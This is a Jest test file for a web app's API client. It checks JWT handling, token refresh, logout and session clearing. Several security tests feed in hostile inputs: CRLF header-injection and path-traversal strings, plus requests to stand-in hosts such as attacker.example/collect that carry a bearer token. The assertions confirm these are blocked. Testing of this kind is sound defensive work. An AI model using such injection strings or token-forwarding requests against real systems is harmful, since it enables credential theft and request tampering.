import {
  clearSession,
  ensureValidSession,
  getApiUrl,
  logoutSession,
  request,
  requestBlob,
  requestRaw,
} from "@/lib/api-client";

const API_V1_BASE = "http://localhost:3001/api/v1";

// ── localStorage mock ───────────────────────────────────────────────────────

let store: Record<string, string>;

function createLocalStorageMock() {
  store = {};
  return {
    getItem: jest.fn((key: string) => store[key] ?? null),
    setItem: jest.fn((key: string, value: string) => {
      store[key] = value;
    }),
    removeItem: jest.fn((key: string) => {
      delete store[key];
    }),
    clear: jest.fn(() => {
      for (const k of Object.keys(store)) delete store[k];
    }),
    get length() {
      return Object.keys(store).length;
    },
    key: jest.fn(() => null),
  };
}

let lsMock: ReturnType<typeof createLocalStorageMock>;

// ── Helpers ─────────────────────────────────────────────────────────────────

function encodeJwtPart(value: object): string {
  return btoa(JSON.stringify(value))
    .replace(/\+/g, "-")
    .replace(/\//g, "_")
    .replace(/=+$/, "");
}

function createJwt(
  expiresAt = Math.floor(Date.now() / 1000) + 3600,
): string {
  const header = encodeJwtPart({ alg: "HS256", typ: "JWT" });
  const payload = encodeJwtPart({
    sub: "user-1",
    email: "user@example.com",
    role: "user",
    exp: expiresAt,
  });
  return `${header}.${payload}.signature`;
}

function createExpiredJwt(): string {
  return createJwt(Math.floor(Date.now() / 1000) - 1);
}

function setTokens(access: string, refresh?: string) {
  lsMock.setItem("auth-token", access);
  if (refresh) lsMock.setItem("auth-refresh-token", refresh);
}

function clearTokens() {
  lsMock.removeItem("auth-token");
  lsMock.removeItem("auth-refresh-token");
  lsMock.removeItem("refresh-token");
}

/** Build a mock Response-like object */
function mockResponse(
  body: unknown,
  init: { status?: number; headers?: Record<string, string> } = {},
): Response {
  const status = init.status ?? 200;
  const headers = new Headers(init.headers ?? {});
  if (!headers.has("Content-Type")) {
    headers.set("Content-Type", "application/json");
  }
  return {
    ok: status >= 200 && status < 300,
    status,
    statusText: status === 200 ? "OK" : "Error",
    headers,
    json: () => Promise.resolve(body),
    text: () => Promise.resolve(JSON.stringify(body)),
    arrayBuffer: () => Promise.resolve(new ArrayBuffer(0)),
    blob: () => Promise.resolve(new Blob()),
    formData: () => Promise.resolve(new Blob()),
    clone: () => mockResponse(body, init),
    body: null,
    bodyUsed: false,
    redirected: false,
    type: "basic" as ResponseType,
    url: "",
    bytes: () => Promise.resolve(new Uint8Array()),
  } as unknown as Response;
}

// ── Fetch mock ──────────────────────────────────────────────────────────────

const originalFetch = globalThis.fetch;
let mockFetch: jest.Mock;

// ── Location mock ───────────────────────────────────────────────────────────

let locationHref = "";

beforeEach(() => {
  lsMock = createLocalStorageMock();
  // jsdom's localStorage is a non-functional stub; replace it entirely
  // Use direct assignment since the property is configurable in jsdom
  try {
    Object.defineProperty(window, "localStorage", {
      value: lsMock,
      writable: true,
      configurable: true,
    });
  } catch {
    // Fallback: some jsdom versions use a getter
    (window as any).localStorage = lsMock;
  }

  clearTokens();

  mockFetch = jest.fn();
  globalThis.fetch = mockFetch;

  // Prevent actual navigation on redirect
  locationHref = "";
  Object.defineProperty(window, "location", {
    value: {
      pathname: "/dashboard",
      search: "",
      get href() {
        return locationHref;
      },
      set href(v: string) {
        locationHref = v;
      },
    },
    writable: true,
    configurable: true,
  });
});

afterEach(() => {
  globalThis.fetch = originalFetch;
});

// ── Tests ───────────────────────────────────────────────────────────────────

describe("canonical API authentication", () => {
  it("builds canonical versioned URLs from the configured origin", () => {
    expect(getApiUrl("auth/login")).toBe(`${API_V1_BASE}/auth/login`);
    expect(getApiUrl("documents/upload")).toBe(
      `${API_V1_BASE}/documents/upload`,
    );
    expect(getApiUrl("/api/documents")).toBe(`${API_V1_BASE}/documents`);
  });

  it("rejects malformed, external, and canonical-root-escaping API URLs", () => {
    expect(() => getApiUrl("auth\\login")).toThrow();
    expect(() => getApiUrl("\nauth/login")).toThrow();
    expect(() => getApiUrl("auth%0d%0aX-Injected:%20yes")).toThrow();
    expect(() => getApiUrl("../outside")).toThrow();
    expect(() => getApiUrl("https://evil.example/attack")).toThrow();
  });

  it("never forwards managed or caller bearer tokens to external origins", async () => {
    mockFetch.mockResolvedValueOnce(mockResponse({ external: true }));
    setTokens(createJwt(), createJwt());

    await request("https://attacker.example/collect", {
      headers: { Authorization: "Bearer caller-token" },
    });

    const [, options] = mockFetch.mock.calls[0];
    expect(options.headers.get("Authorization")).toBeNull();
    expect(lsMock.getItem("auth-token")).not.toBeNull();
  });

  it("proactively establishes a session from an expired access token", async () => {
    const refreshedToken = createJwt();
    mockFetch.mockResolvedValueOnce(
      mockResponse({ access_token: refreshedToken }),
    );
    setTokens(createExpiredJwt(), createJwt());

    await expect(ensureValidSession()).resolves.toBe(refreshedToken);
    expect(mockFetch).toHaveBeenCalledTimes(1);
    expect(mockFetch.mock.calls[0][0]).toBe(`${API_V1_BASE}/auth/refresh`);
  });

  it.each([429, 503])(
    "preserves the local session when refresh is temporarily unavailable",
    async (status) => {
      mockFetch.mockResolvedValueOnce(
        mockResponse({ message: "Unavailable" }, { status }),
      );
      setTokens(createExpiredJwt(), createJwt());

      await expect(ensureValidSession()).rejects.toMatchObject({ status });
      expect(lsMock.getItem("auth-token")).not.toBeNull();
      expect(lsMock.getItem("auth-refresh-token")).not.toBeNull();
    },
  );

  it("preserves the local session when a refresh success is malformed", async () => {
    mockFetch.mockResolvedValueOnce(
      mockResponse({ access_token: "not-a-valid-jwt" }),
    );
    setTokens(createExpiredJwt(), createJwt());

    await expect(ensureValidSession()).rejects.toMatchObject({
      status: 502,
      kind: "server",
    });
    expect(lsMock.getItem("auth-token")).not.toBeNull();
    expect(lsMock.getItem("auth-refresh-token")).not.toBeNull();
  });

  it("revokes a valid access token and clears every stored credential", async () => {
    const accessToken = createJwt();
    setTokens(accessToken, createJwt());
    mockFetch.mockResolvedValueOnce(mockResponse({ message: "Logged out" }));

    await expect(logoutSession()).resolves.toBe(true);

    expect(mockFetch).toHaveBeenCalledTimes(1);
    expect(mockFetch).toHaveBeenCalledWith(
      `${API_V1_BASE}/auth/logout`,
      expect.objectContaining({ method: "POST", credentials: "omit" }),
    );
    expect(mockFetch.mock.calls[0][1].headers.get("Authorization")).toBe(
      `Bearer ${accessToken}`,
    );
    expect(lsMock.getItem("auth-token")).toBeNull();
    expect(lsMock.getItem("auth-refresh-token")).toBeNull();
  });

  it("clears local credentials when logout revocation is temporarily unavailable", async () => {
    mockFetch.mockResolvedValueOnce(
      mockResponse({ message: "Unavailable" }, { status: 503 }),
    );
    setTokens(createJwt(), createJwt());

    await expect(logoutSession()).resolves.toBe(false);
    expect(mockFetch).toHaveBeenCalledTimes(1);
    expect(lsMock.getItem("auth-token")).toBeNull();
    expect(lsMock.getItem("auth-refresh-token")).toBeNull();
  });
});

describe("request()", () => {
  // ── Success path ────────────────────────────────────────────────────────

  it("attaches JWT and returns parsed JSON on success", async () => {
    mockFetch.mockResolvedValueOnce(mockResponse({ ok: true }));

    const accessToken = createJwt();
    setTokens(accessToken);
    const data = await request<{ ok: boolean }>("/test");

    expect(data).toEqual({ ok: true });
    expect(mockFetch).toHaveBeenCalledTimes(1);
    const [url, opts] = mockFetch.mock.calls[0];
    expect(url).toBe(`${API_V1_BASE}/test`);
    expect(opts.headers.get("Authorization")).toBe(`Bearer ${accessToken}`);
  });

  it("sends no Authorization header when anonymous is true", async () => {
    mockFetch.mockResolvedValueOnce(mockResponse({ public: true }));

    setTokens(createJwt());
    const data = await request<{ public: boolean }>("/public", {
      anonymous: true,
    });

    expect(data).toEqual({ public: true });
    const [, opts] = mockFetch.mock.calls[0];
    expect(opts.headers.get("Authorization")).toBeNull();
  });

  it("throws ApiError with backend message on non-2xx", async () => {
    mockFetch.mockResolvedValueOnce(
      mockResponse({ message: "Something broke" }, { status: 422 }),
    );

    setTokens(createJwt());

    await expect(request("/fail")).rejects.toMatchObject({
      name: "ApiError",
      status: 422,
      kind: "validation",
      backendMessage: "Something broke",
    });
  });

  it("throws ApiError with network kind on fetch failure", async () => {
    mockFetch.mockRejectedValueOnce(new Error("Network error"));

    setTokens(createJwt());

    await expect(request("/network-fail")).rejects.toMatchObject({
      name: "ApiError",
      status: null,
      kind: "network",
    });
  });

  it("returns undefined for 204 No Content", async () => {
    mockFetch.mockResolvedValueOnce(mockResponse(null, { status: 204 }));

    setTokens(createJwt());
    const result = await request("/resource/1", { method: "DELETE" });
    expect(result).toBeUndefined();
  });

  it("returns the raw response for successful non-JSON mutations", async () => {
    const response = mockResponse(null, { status: 204 });
    mockFetch.mockResolvedValueOnce(response);
    setTokens(createJwt());

    await expect(requestRaw("/resource/1", { method: "DELETE" })).resolves.toBe(
      response,
    );
  });

  it("rejects raw mutations on non-2xx responses", async () => {
    mockFetch.mockResolvedValueOnce(
      mockResponse({ message: "Delete failed" }, { status: 409 }),
    );
    setTokens(createJwt());

    await expect(
      requestRaw("/resource/1", { method: "DELETE" }),
    ).rejects.toMatchObject({ name: "ApiError", status: 409 });
  });

  it("returns a blob for managed binary downloads", async () => {
    const response = mockResponse({ export: true });
    mockFetch.mockResolvedValueOnce(response);
    setTokens(createJwt());

    await expect(requestBlob("/users/me/export")).resolves.toBeInstanceOf(Blob);
  });

  it("serializes plain-object bodies to JSON", async () => {
    mockFetch.mockResolvedValueOnce(mockResponse({ id: "1" }));

    setTokens(createJwt());
    await request("/data", {
      method: "POST",
      body: { title: "Test" },
    });

    const [, opts] = mockFetch.mock.calls[0];
    expect(opts.body).toBe(JSON.stringify({ title: "Test" }));
    expect(opts.headers.get("Content-Type")).toBe("application/json");
  });

  // ── 401 → refresh success → retry success ──────────────────────────────

  it("refreshes token on 401 and retries the original request", async () => {
    const accessToken = createJwt();
    const refreshedToken = createJwt();
    mockFetch.mockResolvedValueOnce(
      mockResponse({ message: "Unauthorized" }, { status: 401 }),
    );
    mockFetch.mockResolvedValueOnce(
      mockResponse({ access_token: refreshedToken }),
    );
    mockFetch.mockResolvedValueOnce(mockResponse({ data: "fresh" }));

    setTokens(accessToken, createJwt());
    const data = await request<{ data: string }>("/data");

    expect(data).toEqual({ data: "fresh" });
    expect(mockFetch).toHaveBeenCalledTimes(3);
    expect(mockFetch.mock.calls[1][0]).toBe(`${API_V1_BASE}/auth/refresh`);
    expect(mockFetch.mock.calls[0][1].headers.get("Authorization")).toBe(
      `Bearer ${accessToken}`,
    );
    expect(mockFetch.mock.calls[2][1].headers.get("Authorization")).toBe(
      `Bearer ${refreshedToken}`,
    );
    expect(lsMock.getItem("auth-token")).toBe(refreshedToken);
  });

  // ── 401 → refresh failure → clear session + redirect ───────────────────

  it("clears session and redirects to /login when refresh fails", async () => {
    // First call: 401
    mockFetch.mockResolvedValueOnce(
      mockResponse({ message: "Unauthorized" }, { status: 401 }),
    );
    // Refresh call: also fails
    mockFetch.mockResolvedValueOnce(
      mockResponse({ message: "Invalid" }, { status: 401 }),
    );

    setTokens(createJwt(), createJwt());

    await expect(request("/secret")).rejects.toMatchObject({
      name: "ApiError",
      status: 401,
      kind: "authRequired",
    });

    expect(lsMock.getItem("auth-token")).toBeNull();
    expect(lsMock.getItem("auth-refresh-token")).toBeNull();
    expect(locationHref).toBe("/login?redirect=%2Fdashboard");
  });

  it("clears session and redirects when no refresh token exists", async () => {
    // First call: 401
    mockFetch.mockResolvedValueOnce(
      mockResponse({ message: "Unauthorized" }, { status: 401 }),
    );

    setTokens(createJwt());

    await expect(request("/secret")).rejects.toMatchObject({
      name: "ApiError",
      status: 401,
      kind: "authRequired",
    });

    expect(lsMock.getItem("auth-token")).toBeNull();
    expect(locationHref).toBe("/login?redirect=%2Fdashboard");
  });

  it("refreshes an expired access token before sending the request", async () => {
    const refreshedToken = createJwt();
    mockFetch.mockResolvedValueOnce(
      mockResponse({ access_token: refreshedToken }),
    );
    mockFetch.mockResolvedValueOnce(mockResponse({ data: "fresh" }));
    setTokens(createExpiredJwt(), createJwt());

    const data = await request<{ data: string }>("/data");

    expect(data).toEqual({ data: "fresh" });
    expect(mockFetch).toHaveBeenCalledTimes(2);
    expect(mockFetch.mock.calls[0][0]).toBe(`${API_V1_BASE}/auth/refresh`);
    expect(mockFetch.mock.calls[1][1].headers.get("Authorization")).toBe(
      `Bearer ${refreshedToken}`,
    );
  });

  it("fails closed without a request when stored tokens are malformed", async () => {
    setTokens("not-a-jwt", createJwt(Math.floor(Date.now() / 1000) - 1));

    await expect(request("/secret")).rejects.toMatchObject({
      status: 401,
      kind: "authRequired",
    });
    expect(mockFetch).not.toHaveBeenCalled();
    expect(lsMock.getItem("auth-token")).toBeNull();
  });

  it("does not recurse when the refresh endpoint itself returns 401", async () => {
    mockFetch.mockResolvedValueOnce(
      mockResponse({ message: "Invalid refresh token" }, { status: 401 }),
    );

    await expect(
      request("/auth/refresh", {
        method: "POST",
        body: { refreshToken: createJwt() },
      }),
    ).rejects.toMatchObject({ status: 401, kind: "authRequired" });
    expect(mockFetch).toHaveBeenCalledTimes(1);
  });

  it("keeps the session when reauthentication has a network failure", async () => {
    const accessToken = createJwt();
    mockFetch.mockResolvedValueOnce(
      mockResponse({ message: "Unauthorized" }, { status: 401 }),
    );
    mockFetch.mockRejectedValueOnce(new Error("offline"));
    setTokens(accessToken, createJwt());

    await expect(request("/secret")).rejects.toMatchObject({
      status: null,
      kind: "network",
    });
    expect(lsMock.getItem("auth-token")).toBe(accessToken);
    expect(lsMock.getItem("auth-refresh-token")).not.toBeNull();
    expect(locationHref).toBe("");
  });

  it("does not attempt refresh for anonymous requests", async () => {
    mockFetch.mockResolvedValueOnce(
      mockResponse({ message: "Unauthorized" }, { status: 401 }),
    );

    await expect(
      request("/public", { anonymous: true }),
    ).rejects.toMatchObject({
      name: "ApiError",
      status: 401,
      kind: "authRequired",
    });

    // Only one fetch call — no refresh attempt
    expect(mockFetch).toHaveBeenCalledTimes(1);
  });
});

// ── clearSession ────────────────────────────────────────────────────────────

describe("clearSession()", () => {
  it("removes canonical and legacy tokens from localStorage", () => {
    setTokens(createJwt(), createJwt());
    lsMock.setItem("refresh-token", createJwt());
    clearSession();
    expect(lsMock.getItem("auth-token")).toBeNull();
    expect(lsMock.getItem("auth-refresh-token")).toBeNull();
    expect(lsMock.getItem("refresh-token")).toBeNull();
  });
});
